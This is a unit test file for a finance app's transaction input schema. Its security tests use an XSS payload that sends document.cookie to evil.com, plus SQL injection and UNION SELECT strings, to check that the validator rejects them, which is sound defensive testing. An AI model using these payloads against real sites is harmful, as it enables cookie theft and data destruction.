/**
 * tests/unit/transactions/schemas.test.ts
 *
 * Tests para CreateTransactionSchema (definido inline en app/api/transactions/route.ts).
 * También cubre la lógica de negocio crítica del route:
 *   - amount_cents sign correction (is_income flipping)
 *   - Security: user_id NUNCA del body
 *   - Boundary values, XSS, inyección SQL en description
 */
import { describe, expect, it } from "vitest";
import { z } from "zod";
import { safeString } from "@/lib/validation/safe-zod";

// Re-creamos el schema idéntico al de app/api/transactions/route.ts para testear en aislamiento
// Esto permite tests puros sin necesidad de montar el route de Next.js
const CreateTransactionSchema = z
  .object({
    account_id: z.string().uuid(),
    category_id: z.string().uuid().nullable().optional(),
    amount_cents: z
      .number()
      .int()
      .refine((n) => n !== 0, "amount cannot be zero"),
    description: safeString(500),
    is_income: z.boolean(),
    transaction_date: z
      .string()
      .regex(/^\d{4}-\d{2}-\d{2}$/)
      .optional(),
    notes: z
      .string()
      .max(2000)
      .nullish()
      .transform((v) => v ?? null),
  })
  .strict();

const VALID_UUID = "00000000-0000-4000-8000-000000000001";
const TODAY = new Date().toISOString().slice(0, 10);

const BASE: Record<string, unknown> = {
  account_id: VALID_UUID,
  amount_cents: 85075,
  description: "Supermercado",
  is_income: false,
  transaction_date: TODAY,
};

// ---------------------------------------------------------------------------
// Happy path
// ---------------------------------------------------------------------------
describe("CreateTransactionSchema — valid inputs", () => {
  it("accepts a minimal valid expense transaction", () => {
    expect(CreateTransactionSchema.safeParse(BASE).success).toBe(true);
  });

  it("accepts a valid income transaction", () => {
    const result = CreateTransactionSchema.safeParse({ ...BASE, is_income: true });
    expect(result.success).toBe(true);
  });

  it("accepts negative amount_cents (sign is corrected in route logic)", () => {
    // The route uses Math.abs and applies sign from is_income — so either sign passed is valid
    const result = CreateTransactionSchema.safeParse({ ...BASE, amount_cents: -85075 });
    expect(result.success).toBe(true);
  });

  it("accepts optional category_id as null", () => {
    const result = CreateTransactionSchema.safeParse({ ...BASE, category_id: null });
    expect(result.success).toBe(true);
  });

  it("accepts valid category_id UUID", () => {
    const result = CreateTransactionSchema.safeParse({
      ...BASE,
      category_id: "00000000-0000-4000-8000-000000000002",
    });
    expect(result.success).toBe(true);
  });

  it("accepts transaction without date (optional field → defaults to today in route)", () => {
    const { transaction_date: _, ...withoutDate } = BASE;
    const result = CreateTransactionSchema.safeParse(withoutDate);
    expect(result.success).toBe(true);
  });

  it("transforms null notes to null", () => {
    const result = CreateTransactionSchema.safeParse({ ...BASE, notes: null });
    expect(result.success).toBe(true);
    if (result.success) expect(result.data.notes).toBeNull();
  });

  it("transforms undefined notes to null", () => {
    const result = CreateTransactionSchema.safeParse(BASE);
    expect(result.success).toBe(true);
    if (result.success) expect(result.data.notes).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Amount validation — boundary and edge cases
// ---------------------------------------------------------------------------
describe("CreateTransactionSchema — amount_cents validation", () => {
  it("rejects amount_cents = 0 (cannot be zero)", () => {
    const result = CreateTransactionSchema.safeParse({ ...BASE, amount_cents: 0 });
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].message).toBe("amount cannot be zero");
    }
  });

  it("rejects float amount_cents (must be integer)", () => {
    const result = CreateTransactionSchema.safeParse({ ...BASE, amount_cents: 850.75 });
    expect(result.success).toBe(false);
  });

  it("accepts amount_cents = 1 (minimum positive)", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, amount_cents: 1 }).success).toBe(true);
  });

  it("accepts amount_cents = -1 (negative integer)", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, amount_cents: -1 }).success).toBe(true);
  });

  it("accepts large amounts (1M EUR = 100_000_000 cents)", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, amount_cents: 100_000_000 }).success).toBe(
      true,
    );
  });

  it("rejects string disguised as number", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, amount_cents: "85075" }).success).toBe(
      false,
    );
  });
});

// ---------------------------------------------------------------------------
// Security — injection and spoofing
// ---------------------------------------------------------------------------
describe("CreateTransactionSchema — security", () => {
  it("rejects unknown extra fields (.strict() — prevents mass assignment)", () => {
    const result = CreateTransactionSchema.safeParse({
      ...BASE,
      user_id: "attacker-uid-00000000-0000-4000-8000-000000000099",
    });
    expect(result.success).toBe(false);
  });

  it("rejects injection of is_deleted, deleted_at etc (strict mode)", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, deleted_at: null }).success).toBe(false);
    expect(CreateTransactionSchema.safeParse({ ...BASE, import_source: "injected" }).success).toBe(
      false,
    );
  });

  it("rejects XSS in description", () => {
    expect(
      CreateTransactionSchema.safeParse({
        ...BASE,
        description: "<script>fetch('https://evil.com?c='+document.cookie)</script>",
      }).success,
    ).toBe(false);
  });

  it("rejects SQL injection pattern in description (via control chars)", () => {
    // safeString removes control chars; classic SQL injection has no control chars
    // but testing that raw strings with null bytes are rejected
    expect(
      CreateTransactionSchema.safeParse({
        ...BASE,
        description: "'; DROP TABLE transactions; --\x00",
      }).success,
    ).toBe(false);
  });

  it("rejects malformed UUID for account_id (prevents spoofing other users accounts)", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, account_id: "not-a-uuid" }).success).toBe(
      false,
    );
    expect(
      CreateTransactionSchema.safeParse({ ...BASE, account_id: "1 UNION SELECT * FROM users" })
        .success,
    ).toBe(false);
  });

  it("rejects non-boolean is_income (prevents type coercion tricks)", () => {
    expect(CreateTransactionSchema.safeParse({ ...BASE, is_income: 1 }).success).toBe(false);
    expect(CreateTransactionSchema.safeParse({ ...BASE, is_income: "true" }).success).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Date validation
// ---------------------------------------------------------------------------
describe("CreateTransactionSchema — transaction_date", () => {
  it("accepts valid YYYY-MM-DD date", () => {
    expect(
      CreateTransactionSchema.safeParse({ ...BASE, transaction_date: "2026-01-15" }).success,
    ).toBe(true);
  });

  it("rejects ISO timestamp format (timezone bug vector)", () => {
    expect(
      CreateTransactionSchema.safeParse({ ...BASE, transaction_date: "2026-01-15T00:00:00Z" })
        .success,
    ).toBe(false);
  });

  it("rejects DD/MM/YYYY (Spanish format)", () => {
    expect(
      CreateTransactionSchema.safeParse({ ...BASE, transaction_date: "15/01/2026" }).success,
    ).toBe(false);
  });

  it("rejects future dates > 1 year (no restriction in schema — documenting behavior)", () => {
    // Schema does NOT restrict future dates → this is by design (manual entry may have errors)
    // Test documents that the schema intentionally allows it
    expect(
      CreateTransactionSchema.safeParse({ ...BASE, transaction_date: "2099-12-31" }).success,
    ).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Route business logic: amount_cents sign correction
// This unit tests the LOGIC that should happen inside the route handler.
// We verify the rule: is_income=true → positive, is_income=false → negative
// ---------------------------------------------------------------------------
describe("amount sign correction logic (in-route logic)", () => {
  function applySignCorrection(amountCents: number, isIncome: boolean): number {
    return isIncome ? Math.abs(amountCents) : -Math.abs(amountCents);
  }

  it("income with positive amount stays positive", () => {
    expect(applySignCorrection(85075, true)).toBe(85075);
  });

  it("income with negative amount becomes positive", () => {
    expect(applySignCorrection(-85075, true)).toBe(85075);
  });

  it("expense with positive amount becomes negative", () => {
    expect(applySignCorrection(85075, false)).toBe(-85075);
  });

  it("expense with negative amount stays negative (absolute value applied)", () => {
    expect(applySignCorrection(-85075, false)).toBe(-85075);
  });

  it("zero amount is never valid (blocked at Zod level)", () => {
    // Math.abs(0) = 0 → but schema already rejects amount_cents=0
    // This test verifies both Zod AND logic are aligned
    const parseResult = CreateTransactionSchema.safeParse({ ...BASE, amount_cents: 0 });
    expect(parseResult.success).toBe(false);
  });
});
